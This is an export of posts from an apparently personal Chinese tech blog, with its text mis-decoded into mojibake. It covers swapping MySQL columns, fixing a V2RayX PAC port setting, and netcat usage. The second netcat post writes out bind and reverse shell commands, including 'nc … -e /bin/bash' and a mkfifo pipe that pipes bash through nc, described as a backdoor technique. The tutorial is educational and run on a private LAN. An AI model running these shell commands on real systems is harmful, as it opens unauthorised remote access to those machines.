å‡ºäº†çº°æ¼ã€‚åˆå¹¶å¢é‡æ•°æ®çš„æ—¶å€™ï¼ŒCSV çš„åˆ—ä¸ sample è¡¨çš„åˆ—æ²¡å¯¹é½ï¼Œå³æœ‰ä¸¤åˆ—äº¤æ¢äº†ä½ç½®ã€‚ è§£å†³æ‰€ä»¥ï¼Œè§£å†³ç›®æ ‡å°±æ˜¯ï¼Œå¯¹äºæ•°æ®è¡¨é‡Œå‡ºé—®é¢˜çš„è¡Œï¼Œè¦å°†è¯¥ä¸¤åˆ—äº¤æ¢å›æ¥ã€‚ æ–¹æ¡ˆä¸€åˆ©ç”¨ä¸´æ—¶å˜é‡ tempï¼Œé€‚ç”¨åœºæ™¯ï¼šx ä¸ y å¿…é¡»éƒ½ä¸ä¸º NULL 1UPDATE sample SET x&#x3D;y, y&#x3D;@temp WHERE (@temp:&#x3D;x) IS NOT NULL; æ–¹æ¡ˆäºŒï¼ˆç¬”è€…é€‰ç”¨çš„æ–¹æ¡ˆï¼‰åŒæ ·åˆ©ç”¨ä¸´æ—¶å˜é‡ tempï¼Œä½†æ˜¯ x ä¸ y æ²¡æœ‰ä¸ä¸º NULL çš„é™åˆ¶ 1UPDATE sample SET x&#x3D;(@temp:&#x3D;x), x&#x3D;y, y&#x3D;@temp; æ–¹æ¡ˆä¸‰s1 å¾—åˆ°æ›´æ–°ï¼Œè€Œ s2 åˆ™ç”¨æ¥æ‹‰å–è€æ•°æ®ï¼ˆæ³¨ï¼šè¯¥æ–¹æ¡ˆè¦æ±‚è¡¨å¿…é¡»æœ‰ä¸»é”®idï¼‰ 1UPDATE sample s1, sample s2 SET s1.x&#x3D;s1.y, s1.y&#x3D;s2.x WHERE s1.id&#x3D;s2.id; æ–¹æ¡ˆå››ï¼ˆå¦‚æœ x ä¸ y éƒ½æ˜¯æ•°å€¼å‹ï¼‰1UPDATE sample SET x&#x3D;x+y,y&#x3D;x-y,x&#x3D;x-y; æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://blog.chaosjohn.com/tags/MySQL/"}]},{"title":"ä¿®å¤ V2RayX çš„ PAC æ¨¡å¼å¤±æ•ˆ","slug":"Fix-PAC-mode-of-V2RayX-not-working","date":"2020-12-12T16:41:13.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Fix-PAC-mode-of-V2RayX-not-working.html","link":"","permalink":"https://blog.chaosjohn.com/Fix-PAC-mode-of-V2RayX-not-working.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ é—®é¢˜èµ·å› ç¬”è€…åœ¨Nå¹´å‰å°±å¼€å§‹æ‹¿ 5had0w50ck5X(-NG) ç”¨ä»¥æŸ¥èµ„æ–™ï¼Œæ‰€ä»¥ä¹ æƒ¯äº†ç”¨ 1080 ä½œä¸ºæœ¬åœ° socks5 ä»£ç†çš„ç«¯å£å·ã€‚ å› ä¸ºæŸäº›ä¸å¯æŠ—åŠ›å› ç´ ï¼Œç¬”è€…ä¸å¾—ä¸æ”¾å¼ƒè¯¥è½¯ä»¶ï¼Œè½¬è€ŒæŠ•é™ V2RayX çš„æ€€æŠ±ã€‚ çœŸçš„æŒºå¥½ç”¨çš„ï¼Œé™¤å¼€å®ƒçš„ PAC Mode ä¸èµ·ä½œç”¨è¿™ä¸€ç‚¹ã€‚ å…·ä½“è¡¨ç°ä¸ºï¼Œåœ¨ Safari é‡Œå›½å†…ç½‘ç«™èƒ½æ­£å¸¸æ‰“å¼€ï¼Œä½†æ˜¯å—é™ç½‘ç«™è®¿é—®ä¸äº†ã€‚ æ’æŸ¥é—®é¢˜å…ˆä¸Šè½¯ä»¶è®¾ç½®é¡µçš„æˆªå›¾ï¼š å› ä¸º Global Mode æ˜¯å¥½ä½¿çš„ï¼Œæ‰€ä»¥ v2ray-core æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œé‚£é—®é¢˜è‚¯å®šå‡ºåœ¨ PAC Mode æœ¬èº«ã€‚ ç‚¹å‡» Edit pac file ä¼šè‡ªåŠ¨æ‰“å¼€ Finder å¹¶å®šä½åˆ° $HOME/Library/Application Support/V2RayX/pac ç›®å½•ï¼Œè¯¥ç›®å½•ä¸‹åªæœ‰ä¸€ä¸ªæ–‡ä»¶ pac.js å…ˆæ£€æŸ¥ä¸€ä¸‹ pac.js çš„å†…å®¹ 12345678910111213141516var V2Ray &#x3D; &quot;SOCKS5 127.0.0.1:1081; SOCKS 127.0.0.1:1081; DIRECT;&quot;;var domains &#x3D; [ ... ... ...];function FindProxyForURL(url, host) &#123; for (var i &#x3D; domains.length - 1; i &gt;&#x3D; 0; i--) &#123; if (dnsDomainIs(host, domains[i])) &#123; return V2Ray; &#125; &#125; return &quot;DIRECT&quot;;&#125; domains é‡Œå­˜æ”¾çš„æ˜¯éœ€è¦èµ° ä»£ç† çš„åŸŸåï¼Œç€é‡æ£€æŸ¥äº†å‡ ä¸ªï¼Œéƒ½åœ¨å…¶ä¸­ï¼Œæ‰€ä»¥æ’é™¤äº† åŸŸååˆ—è¡¨å¤±æ•ˆ çš„å› ç´ ã€‚ çªç„¶æˆ‘ä¸€æ‹è„‘è¢‹çš„å‘ç°ï¼š æˆ‘åœ¨ GUIè®¾ç½® é‡Œé…ç½®çš„æœ¬åœ° Socks5 Port ä¸º 1080 pac.js é‡Œç¬¬ä¸€è¡Œï¼Œé…ç½®çš„ç«¯å£å´ä¸º 1081 è¿™ã€‚ã€‚ã€‚è¦æ˜¯èƒ½èµ°é€šä»£ç†å°±å¥‡äº†æ€ªäº†ï¼ï¼ï¼ æŠŠ pac.js é‡Œçš„ 1081 æ”¹ä¸º 1080ï¼ŒPAC Mode å°±ç«‹åˆ»æ­£å¸¸å·¥ä½œäº†ã€‚ å†™åœ¨æœ€åå¹³æ—¶å‘ç°é—®é¢˜ä¹‹åï¼Œé™¤äº†å»ç½‘ä¸ŠæŸ¥è§£å†³åŠæ³•ï¼Œå¯ä»¥å…ˆè‡ªå·±æ£€æŸ¥ä¸€ä¸‹è®¾ç½®ï¼Œè‡ªè¡Œæ’æŸ¥ä¸€ä¸‹åŸå› ï¼Œä¸ä»…èƒ½è·å¾—æˆå°±æ„Ÿï¼Œè¿˜èƒ½é”»ç‚¼æ€ç»´èƒ½åŠ›ã€‚ æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"OS X & macOS","slug":"OS-X-macOS","permalink":"https://blog.chaosjohn.com/tags/OS-X-macOS/"},{"name":"proxy","slug":"proxy","permalink":"https://blog.chaosjohn.com/tags/proxy/"},{"name":"v2ray","slug":"v2ray","permalink":"https://blog.chaosjohn.com/tags/v2ray/"},{"name":"PAC","slug":"PAC","permalink":"https://blog.chaosjohn.com/tags/PAC/"}]},{"title":"TCP/IP ç‘å£«å†›åˆ€ - netcat (ç¯‡äºŒ)","slug":"TCP-IP-Swiss-Army-Knife-netcat-2","date":"2020-12-11T11:19:36.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"TCP-IP-Swiss-Army-Knife-netcat-2.html","link":"","permalink":"https://blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-2.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ å‰è¨€æ˜¨æ—¥å†™ TCP/IP ç‘å£«å†›åˆ€ - netcat (ç¯‡ä¸€) çš„æ—¶å€™ï¼Œç¿»é˜…äº†å¤§é‡çš„èµ„æ–™ï¼Œæµè§ˆå™¨çš„æ ‡ç­¾ä¹Ÿéƒ½å¼€æ»¡äº†ã€‚æ‰€ä»¥è¶å¤§è„‘è¿˜ä¾æ—§æ´»è·ƒï¼Œä»Šå¤©ä¹˜èƒœè¿½å‡»å†™ä¸ª ç¯‡äºŒï¼Œä»ç„¶æ˜¯ä»¥ GIF åŠ¨å›¾æ¼”ç¤ºå…¶æ¡ˆä¾‹ã€‚ è¡¥ä¸Šç¯‡ä¸Šç¯‡é‡Œæœ‰æåˆ°ï¼Œå¦‚æœåªç”¨ netcat è¿›è¡Œç«¯å£è½¬å‘ï¼Œå¿…é¡»ç”¨åˆ° GNU ç‰ˆæœ¬ï¼ˆå› å…¶æ‹¥æœ‰ -c / -e å‚æ•°ï¼‰ï¼š -c shell commands è°ƒç”¨ /bin/sh æ¥æ‰§è¡Œå‘½ä»¤ -e filename é€šè¿‡ç¨‹åºæ–‡ä»¶è·¯å¾„æ¥æ‰§è¡Œç¨‹åº ä¸Šæ¡ˆä¾‹ï¼š è¿œç«¯æ‰§è¡Œ nc -l -k -p 8080 -c &quot;nc 192.168.1.21 22&quot;ï¼Œå³å¯å°† 8080 ç«¯å£è½¬å‘åˆ° 192.168.1.21:22 æœ¬åœ°æ‰§è¡Œ ssh 10.144.137.114 -p 8080 å³å¯æµ‹è¯•è½¬å‘æˆåŠŸ åå¼¹ Shellnetcat åœ¨ç½‘ç»œåº”ç”¨ä¸­ï¼Œå¾ˆå—é»‘å®¢çš„å–œçˆ±ï¼Œåå¼¹ Shell æ˜¯å…¶ç»å¸¸ä½¿ç”¨çš„åœºæ™¯ã€‚ ä»€ä¹ˆæ˜¯ åå¼¹ Shell å‘¢ï¼Ÿç»™ä¸ªä¸€å¥è¯è§£é‡Šï¼šåœ¨ç›®æ ‡æœºå™¨ä¸Šï¼Œå¼¹ä¸€ä¸ª Shell å‡ºæ¥ä½œä¸ºå…¶åé—¨ï¼Œä¸æœ¬åœ°æœºå™¨è¿›è¡Œé€šä¿¡ï¼Œå³ æœ¬åœ°æœºå™¨ å¯ç›´æ¥è®¿é—® ç›®æ ‡æœºå™¨ çš„ Shellã€‚ è€Œ åå¼¹ Shell ä¹Ÿåˆ†ä¸ºä¸¤ç§ï¼š æ­£å‘ Shellï¼Œåˆå bind shell åå‘ Shellï¼Œåˆå reverse shell å› ä¸ºè¦å¼¹ä¸ª Shell å‡ºæ¥ï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½éœ€è¦è®¿é—®åˆ° Shellï¼Œ/bin/sh æˆ– /bin/bash æˆ– /bin/zsh éƒ½å¯ä»¥ã€‚æ—¢ç„¶ç”¨åˆ°å¤–éƒ¨ Shell ç¨‹åºï¼Œé‚£ä¸€èˆ¬éƒ½æ˜¯ä½¿ç”¨ GNU ç‰ˆæœ¬çš„ netcatï¼ˆç”¨åˆ°å…¶ -c / -e å‚æ•°ï¼‰ æ­£å‘ Shellå…ˆå¼¹åè¿æ¥ï¼Œå³è®© ç›®æ ‡æœºå™¨ å…ˆå¼¹ä¸ª Shellï¼Œæš´éœ²åœ¨æŸç«¯å£ï¼Œç„¶å æœ¬åœ°æœºå™¨ è¿æ¥ä¸Š ç›®æ ‡æœºå™¨ è¯¥ç«¯å£ï¼Œå³å¯è®¿é—®ç›®æ ‡æœºå™¨çš„ Shellã€‚ ç›®æ ‡æœºå™¨ï¼šnc -l -p 8080 -e /bin/bash æœ¬åœ°æœºå™¨ï¼šnc 10.144.137.114 8080 åå‘ Shellå…ˆç›‘å¬åè¿æ¥ï¼Œå³ æœ¬åœ°æœºå™¨ å…ˆç›‘å¬ ç›®æ ‡æœºå™¨ çš„æŸç«¯å£ï¼Œå¦‚æœ ç›®æ ‡æœºå™¨ åœ¨è¯¥ç«¯å£å¼¹å‡ºäº† Shellï¼Œå°±å¯ç«‹å³è¿æ¥ä¸Šã€‚ æœ¬åœ°æœºå™¨ï¼šnc -v -l -p 8080 ç›®æ ‡æœºå™¨ï¼šnc 10.144.247.172 8080 -e /bin/bash OpenBSD netcat å®ç°æ­£å‘ Shellé‚£å¦‚æœéè¦ç”¨ OpenBSD ç‰ˆæœ¬çš„ netcatï¼Œæ­é…ä»€ä¹ˆä½¿ç”¨å¯ä»¥åå¼¹ Shell å‘¢ï¼Ÿè¿™é‡Œç¬”è€…åˆ—ä¸¾ä¸€ä¸ªåˆ—å­ - å‘½åç®¡é“ï¼ˆnamed pipeï¼‰ï¼Œåˆå FIFOï¼Œå³ first in first out å…ˆè¿›å…ˆå‡ºã€‚ ç›®æ ‡æœºå™¨å…ˆæ‰§è¡Œï¼šmkfifo /tmp/pipe åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“ ç›®æ ‡æœºå™¨å†æ‰§è¡Œï¼šcat /tmp/pipe | /bin/bash 2&gt;&amp;1 | nc -l -p 8080 &gt; /tmp/pipe è¿›è¡Œåå¼¹ Shell æœ¬åœ°æœºå™¨æ‰§è¡Œï¼šnc 192.168.1.21 8080 å‘½åç®¡é“ çš„ stdoutï¼ˆæ ‡å‡†è¾“å‡ºï¼‰ é€šè¿‡ &quot;|&quot; æµå‘ bash 2&gt;&amp;1 è¡¨ç¤º bash çš„ stderrï¼ˆæ ‡å‡†é”™è¯¯ï¼‰ é‡å®šå‘åˆ° stdoutï¼ˆæ ‡å‡†è¾“å‡ºï¼‰ bash çš„ stdoutï¼ˆæ ‡å‡†è¾“å‡ºï¼‰ é€šè¿‡ &quot;|&quot; æµå‘ ç›®æ ‡æœºå™¨çš„ nc è¿›è€Œé€šè¿‡ TCP/UDP è¿æ¥ æµå‘ æœ¬åœ°æœºå™¨çš„ nc å¹¶æ˜¾ç¤º æœ¬åœ°æœºå™¨ è¾“å…¥çš„å‘½ä»¤å†é€šè¿‡ æœ¬åœ°æœºå™¨çš„ nc æµå‘ ç›®æ ‡æœºå™¨çš„ nc ç›®æ ‡æœºå™¨çš„ nc å°†æ¥æ”¶åˆ°çš„å‘½ä»¤è¾“å…¥ å‘½åç®¡é“ è‡³æ­¤å½¢æˆä¸€ä¸ªå®Œæ•´çš„å¾ªç¯ å†™åœ¨æœ€åæœ¬æ–‡æ¼”ç¤ºäº†ç”¨ netcat å®ç° ç«¯å£è½¬å‘ å’Œ åå¼¹ Shellï¼Œè¿˜æœ‰å¾ˆå¤šæ¡ˆä¾‹ï¼Œç­‰å¾…è¯»è€…ä»¬å»å‘æ˜ï¼ æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"TCP/IP","slug":"TCP-IP","permalink":"https://blog.chaosjohn.com/tags/TCP-IP/"},{"name":"netcat","slug":"netcat","permalink":"https://blog.chaosjohn.com/tags/netcat/"}]},{"title":"TCP/IP ç‘å£«å†›åˆ€ - netcat (ç¯‡ä¸€)","slug":"TCP-IP-Swiss-Army-Knife-netcat-1","date":"2020-12-10T07:53:50.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"TCP-IP-Swiss-Army-Knife-netcat-1.html","link":"","permalink":"https://blog.chaosjohn.com/TCP-IP-Swiss-Army-Knife-netcat-1.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ å‰è¨€æœ¬æ¥æ‰“ç®—å†™ ç«¯å£è½¬å‘(ç¯‡ä¸‰) - netcat ä½†æ˜¯ä¸­é€”å‘ç° netcat æ°´å¾ˆæ·±ï¼ŒåŸå› å¬æˆ‘ç»†ç»†è¯´æ¥ netcat è¢«æˆä¸º TCP/IP çš„ç‘å£«å†›åˆ€ï¼Œå¾—ç›Šäºå®ƒè™½ä½“ç§¯å°ï¼ˆå‡ åKBï¼‰å´åœ¨ç½‘ç»œä¸‹æ— æ¯”å¼ºå¤§ï¼Œåœ¨å„ç§åœºæ™¯ä¸‹éƒ½æœ‰å®ƒå‘æŒ¥çš„ä½™åœ°ï¼Œä»¥è‡³äºåœ¨å„å¤§ Linux å‘è¡Œç‰ˆ ä¸­éƒ½é»˜è®¤å®‰è£…ã€‚ åŸç‰ˆçš„ netcat ç¬¬ä¸€ç‰ˆåœ¨ 1995å¹´10æœˆ28æ—¥ è¢«å‘å¸ƒï¼Œä¸”æœ€åä¸€ä¸ªç‰ˆæœ¬ 1.10 å‘å¸ƒäº 1996å¹´3æœˆï¼Œè¢«ç§°ä¹‹ä¸º tranditional netcatã€‚ éšåï¼Œä¸ºäº†å…¼å®¹ POSIXï¼Œæ¨å‡ºäº†ä¸åŒå®ç°çš„ç‰ˆæœ¬ï¼Œæœ€æœ‰åçš„ä¸º OpenBSD netcat å’Œ GNU netcatï¼š OpenBSD ç‰ˆæœ¬çš„æ”¯æŒ IPv6 å’Œ TLS GNU ç‰ˆæœ¬çš„æ”¯æŒ -e å‚æ•°ï¼Œå¯ä»¥åœ¨å»ºç«‹è¿æ¥åæ‰§è¡Œå‘½ä»¤ å¾ˆæœ‰æ„æ€çš„æ˜¯ï¼š å¤§éƒ¨åˆ†çš„ Linux å‘è¡Œç‰ˆï¼Œä»¥åŠ macOS / FreeBSDï¼Œé¢„è£…çš„éƒ½æ˜¯ OpenBSD netcatï¼Œå¦‚æœè¦ä½¿ç”¨ GNU ç‰ˆçš„ï¼Œå¾—è‡ªè¡Œä»åŒ…ç®¡ç†å™¨å®‰è£…ã€‚ Windows ä¸Šåªæœ‰ GNU netcat æ°´å¾ˆæ·± çš„åŸå› å°±åœ¨äºï¼Œå¦‚æœåªç”¨ netcat è¿›è¡Œç«¯å£è½¬å‘ï¼Œå¿…é¡»ç”¨åˆ° GNU ç‰ˆæœ¬çš„ -e å‚æ•°ï¼Œæ‰€ä»¥å°±ä¸´æ—¶æ›´æ”¹ä¸€ä¸‹æœ¬æ–‡é¢˜æï¼Œè®²è§£ä¸€ä¸‹ netcat çš„ä½¿ç”¨ä»¥åŠæ¡ˆä¾‹ï¼Œä¸”ä¸»è¦é’ˆå¯¹ OpenBSD netcatã€‚ ä½¿ç”¨ æˆ‘ä»¬å…ˆè°ƒç”¨ nc -h æ¥çœ‹ä¸€ä¸‹ï¼š1234567891011121314151617181920212223242526272829303132333435363738394041424344$ nc -hOpenBSD netcat (Debian patchlevel 1)usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl] [-m minttl] [-O length] [-P proxy_username] [-p source_port] [-q seconds] [-s sourceaddr] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]] [destination] [port] Command Summary: -4 Use IPv4 -6 Use IPv6 -b Allow broadcast -C Send CRLF as line-ending -D Enable the debug socket option -d Detach from stdin -F Pass socket fd -h This help text -I length TCP receive buffer length -i interval Delay interval for lines sent, ports scanned -k Keep inbound sockets open for multiple connects -l Listen mode, for inbound connects -M ttl Outgoing TTL &#x2F; Hop Limit -m minttl Minimum incoming TTL &#x2F; Hop Limit -N Shutdown the network socket after EOF on stdin -n Suppress name&#x2F;port resolutions -O length TCP send buffer length -P proxyuser Username for proxy authentication -p port Specify local port for remote connects -q secs quit after EOF on stdin and delay of secs -r Randomize remote ports -S Enable the TCP MD5 signature option -s sourceaddr Local source address -T keyword TOS value -t Answer TELNET negotiation -U Use UNIX domain socket -u UDP mode -V rtable Specify alternate routing table -v Verbose -W recvlimit Terminate after receiving a number of packets -w timeout Timeout for connects and final net reads -X proto Proxy protocol: &quot;4&quot;, &quot;5&quot; (SOCKS) or &quot;connect&quot; -x addr[:port] Specify proxy address and port -Z DCCP mode -z Zero-I&#x2F;O mode [used for scanning] Port numbers can be individual or ranges: lo-hi [inclusive] æˆ‘ä»¬æŒ‘å‡ ä¸ªå¸¸ç”¨çš„å‚æ•°è§£é‡Šä¸€ä¸‹ï¼š -4 å…è®¸ IPv4ï¼ˆé»˜è®¤å…è®¸ï¼‰ -6 å…è®¸ IPv6 -k keep-aliveï¼Œä¸Šä¸€ä¸ªsocketç»“æŸåä»å¯ä»¥é‡æ–°å»ºç«‹socketå†æ¬¡è¢«è¿æ¥ -p æœ¬åœ°ç«¯å£ -l ç›‘å¬æ¨¡å¼ï¼Œåœ¨ OpenBSD ç‰ˆä¸‹å¯çœç•¥ -pï¼Œå³ â€œ-l 8080â€œ ç­‰åŒäº GNU ç‰ˆçš„ â€œ-l -p 8080â€œ -q åœ¨æ¥æ”¶åˆ° EOF åç­‰å¾…é¢„è®¾çš„ç§’æ•°ï¼Œç„¶åæ–­å¼€è¿æ¥ -U ä½¿ç”¨ Unix Socket -u ä½¿ç”¨ UDP æ¨¡å¼ -v è¾“å‡ºè¯¦ç»†ä¿¡æ¯ï¼ˆGNU ç‰ˆæœ‰ -vv æ¨¡å¼ï¼Œå¯è¾“å‡ºæ›´è¯¦ç»†çš„ä¿¡æ¯ï¼‰ -w é¢„è®¾è¿æ¥è¶…æ—¶æ—¶é—´ -z è¡¨ç¤ºä¸å‘é€æ•°æ® æ¡ˆä¾‹å¤§éƒ¨åˆ†çš„æ¡ˆä¾‹ï¼Œç¬”è€…éƒ½å½•åˆ¶äº†ç»ˆç«¯çš„ GIF åŠ¨å›¾ï¼š tmux ä¼šè¯å·¦ä¾§ä¸ºæœ¬åœ° macOSï¼ŒIPä¸º 192.168.1.100 tmux ä¼šè¯å³ä¾§ä¸ºè¿œç«¯ Linuxï¼ŒIPä¸º 192.168.1.39 ä¸€æ¬¡æ€§èŠå¤©å®¤ è¿œç«¯æ‰§è¡Œ nc -l 1234 -4 -6 å¼€å¯ -4 å’Œ -6 å‚æ•°ï¼Œæ—¢ç›‘å¬ IPv4 åˆç›‘å¬ IPv6ï¼ˆå¯çœç•¥ -4ï¼‰ è¿æ¥æˆåŠŸåï¼Œä¸¤è¾¹å‡å¯é”®å…¥å­—ç¬¦ï¼Œç„¶åæŒ‰ä¸‹å›è½¦é”®å‘é€ç»™å¯¹æ–¹ æœ¬åœ°ä½¿ç”¨ CTRL-D å…³é—­è¿æ¥ï¼Œå› é»˜è®¤ä¸º TCP æ¨¡å¼ï¼Œè¿œç«¯ä¹Ÿä¼šé»˜è®¤é€€å‡º ä¼ªå¸¸é©» èŠå¤©å®¤ è¿œç«¯æ‰§è¡Œ while true; do nc -l 1234; doneï¼Œä½¿å¾—è¿æ¥ä¸€æ—¦ç»“æŸï¼Œè¿œç«¯ä¼šå†æ¬¡å‘èµ·ç›‘å¬ UDP èŠå¤©å®¤ è¿œç«¯æ‰§è¡Œ nc -l 1234 -uï¼Œæœ¬åœ°ä¹Ÿéœ€è¦åŠ  -u å‚æ•°æ‰èƒ½è¿æ¥ ä¸ TCPè¿æ¥ æœ‰å¼€å§‹æœ‰ç»“æŸä¸åŒï¼ŒUDP æ¨¡å¼å¹¶æ²¡æœ‰ å…³é—­è¿æ¥ ä¹‹è¯´ï¼Œæ‰€ä»¥ CTRL-D æ— æ•ˆï¼Œåªèƒ½åœ¨ä¸¤ç«¯åˆ†åˆ«ç”¨ CTRL-C ç»“æŸè¿›ç¨‹ é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿œç«¯å¤„ç†å®Œä¸€æ¬¡è¿æ¥åï¼Œå¹¶ä¸ä¼šå†æ¬¡ç›‘å¬æ–°çš„è¯·æ±‚ï¼Œæ‰€ä»¥åŠ ä¸Š -k å‚æ•°ï¼Œå¯ä»¥ç»´æ´»å¤„ç†å¤šæ¬¡è¿æ¥ å‘èµ· HTTP è¯·æ±‚ï¼ˆäº¤äº’å¼ï¼‰ è¿œç«¯æ‰§è¡Œ python3 -m simple.http 9876ï¼Œåœ¨ 9876 ç«¯å£å¼€å¯ä¸€ä¸ªæ–‡ä»¶ Web æœåŠ¡å™¨ æœ¬åœ°æ‰§è¡Œ nc 192.168.1.39 9876ï¼Œè¿æ¥ä¸Šè¿œç«¯çš„ Web æœåŠ¡å™¨ äº¤äº’å¼çš„è¾“å…¥ GET / æˆ–è€… GET / HTTP/1.0 åï¼Œè¿æŒ‰ä¸¤ä¸‹ å›è½¦é”®ï¼Œå³å¯å‘é€ HTTP è¯·æ±‚ï¼Œå¹¶æ”¶åˆ°è¿œç«¯çš„è¯·æ±‚å“åº” å‘èµ· HTTP è¯·æ±‚ï¼ˆå‘½ä»¤å¼ï¼‰ æœ¬åœ°æ‰§è¡Œ echo -n &quot;GET / HTTP/1.0\\r\\n\\r\\n&quot; | nc 192.168.1.39 9876ï¼ˆæ³¨ï¼šGET / HTTP/1.0\\r\\n\\r\\n å¯ç¼©å†™ä¸º GET /\\r\\n\\r\\nï¼‰ ä¸Šåˆ™æ¡ˆä¾‹ä¸­çš„ â€œè¿æŒ‰ä¸¤ä¸‹ å›è½¦é”®â€œï¼Œå°±æ˜¯æ¨¡æ‹Ÿçš„ â€œè¿ç»­ä¸¤ä¸ª \\r\\nâ€œ æ–‡ä»¶ä¼ è¾“ï¼ˆç®€å•ï¼‰ è¿œç«¯å…ˆæ‰§è¡Œ nc -l 1234 &gt; received_fileï¼Œå¼€å¯ç›‘å¬ï¼Œå¦‚æœå»ºç«‹è¿æ¥ä¸”æœ‰å­—èŠ‚æµå…¥ï¼Œå°±ä¼šè¾“å‡ºåˆ°æ–‡ä»¶ received_file æœ¬åœ°å†æ‰§è¡Œ nc 192.168.1.39 1234 &lt; iTerm2.zipï¼Œå°†æ–‡ä»¶ iTerm2.zip ä¼ è¾“è¿‡å» ç”¨ file å’Œ ls -al å‘½ä»¤æŸ¥çœ‹ä¸€ä¸‹ä¸¤è¾¹æ–‡ä»¶æ˜¯å¦ä¸€è‡´ æ–‡ä»¶ä¼ è¾“ï¼ˆä½¿ç”¨ tar å½’æ¡£ä¼ è¾“å¤šæ–‡ä»¶ï¼‰ è¿œç«¯å…ˆæ‰§è¡Œ tar cvf - text1.txt text2.txt | nc -l 1234 -q 1ï¼Œå…ˆä½¿ç”¨ tar å½’æ¡£å¤šä¸ªæ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ç®¡é“æµå‘ netcat å¹¶å¼€å¯ç›‘å¬ æœ¬åœ°å†æ‰§è¡Œ nc 192.168.1.39 1234 | tar xvf -ï¼Œå»ºç«‹è¿æ¥åè¯»å…¥å­—èŠ‚æµï¼Œç”±ç®¡é“æµå‘ tar åè§£å‹å‡ºåŸå¤šæ–‡ä»¶ -q 1 è¡¨ç¤ºä¼ è¾“å®Œæ¯•åï¼Œç­‰å¾…1såé€€å‡ºï¼Œå¦‚æœæ˜¯ -q 0 åˆ™å¯ç”¨ -N æ¥ä»£æ›¿ socketé€šä¿¡ æœ¬åœ°å…ˆæ‰§è¡Œ nc -lU /tmp/socketï¼Œä½¿ç”¨ -U å‚æ•°ä½¿ç”¨å¹¶åˆ›å»ºå¥—æ¥å­—æ–‡ä»¶ æœ¬åœ°æ–°ç»ˆç«¯ echo &quot;hhh&quot; | nc -U /tmp/socketï¼Œå°†å­—ç¬¦ä¸² â€œhhhâ€ å†™å…¥å¥—æ¥å­—æ–‡ä»¶ï¼Œåˆ™åœ¨åŸç»ˆç«¯ä¼šä»å¥—æ¥å­—æ–‡ä»¶ä¸­è¯»å‡º â€œhhhâ€ å­—ç¬¦ä¸² ç½‘ç»œæµ‹é€Ÿï¼ˆé…åˆ dd ä½¿ç”¨ï¼‰ è¿œç«¯å…ˆæ‰§è¡Œ nc -vl 1234 &gt; /dev/nullï¼Œè¡¨ç¤ºè¯»å…¥çš„å­—èŠ‚æµç›´æ¥å†™å…¥ /dev/null æ–‡ä»¶ï¼Œè¿™ä¹ˆåšçš„ç›®çš„æ˜¯æ’é™¤çœŸæ­£æ–‡ä»¶è¯»å†™çš„ç£ç›˜é€Ÿåº¦ä¸Šé™å¹²æ‰° æœ¬åœ°å†æ‰§è¡Œ dd if=/dev/zero bs=1024 count=102400 | nc -vn 192.168.1.39 1234ï¼Œä» /dev/zero ä¸­ä¸æ–­ç”Ÿæˆå­—èŠ‚æµï¼Œæ¯ä¸ªåŒºå—1024ä¸ªå­—èŠ‚ï¼Œä»¥ä¾›102400ä¸ªåŒºå—ï¼Œæ€»è®¡ 100MBï¼Œæœ€å dd æŠ¥å‘Šå¾—å‡ºï¼Œç½‘ç»œé€Ÿç‡ä¸º 7630165 KB/sï¼Œå³ 7.6 MB/sï¼ˆæµ‹è¯•é€Ÿåº¦æ…¢æ˜¯å› ä¸ºè¿œç«¯ Linux æ˜¯æ ‘è“æ´¾ï¼Œé€šè¿‡ 2.4GHz Wi-Fi æ¥å…¥å±€åŸŸç½‘ï¼‰ æœåŠ¡ç«¯å£è¯Šæ–­æ¡ˆä¾‹èƒŒæ™¯ï¼šå…¬å¸çš„ Elastic Search æœåŠ¡å™¨é›†ç¾¤éƒ¨ç½²åœ¨é˜¿é‡Œäº‘ï¼Œå…¶ 9200/9300 ç«¯å£çš„é˜²ç«å¢™ç›´æ¥é‡‡ç”¨é˜¿é‡Œäº‘çš„å®‰å…¨ç»„é…ç½®ï¼Œå†…ç½‘IPå’Œå…¬å¸æ‰€åœ¨çš„å…¬ç½‘IPæ‰å¯ä»¥è®¿é—®ã€‚ æœ¬åœ°å¼€å‘ç¯å¢ƒå¦‚æœå‘ç° Elastic Search è¿æ¥æŠ¥é”™ï¼Œæˆ‘ä»¬ä¼šé‡‡ç”¨ telnet es.example.com 9200 